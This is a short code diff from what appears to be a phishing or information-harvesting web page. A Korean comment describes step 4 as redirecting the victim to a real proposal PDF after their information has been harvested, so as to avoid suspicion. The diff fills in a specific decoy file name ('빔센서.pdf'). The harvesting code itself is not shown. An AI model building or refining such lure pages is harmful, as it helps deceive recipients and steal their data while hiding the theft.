@@ -43,7 +43,7 @@
                 });
 
                 // 4. (선택사항) 정보를 다 캤다면 실제 제안서(PDF 등)로 리다이렉트해서 의심 피하기
-                // setTimeout(() => { window.location.href = "실제_제안서_링크"; }, 2000);
+                // setTimeout(() => { window.location.href = "빔센서.pdf"; }, 2000);
             });
     </script>
 </body>
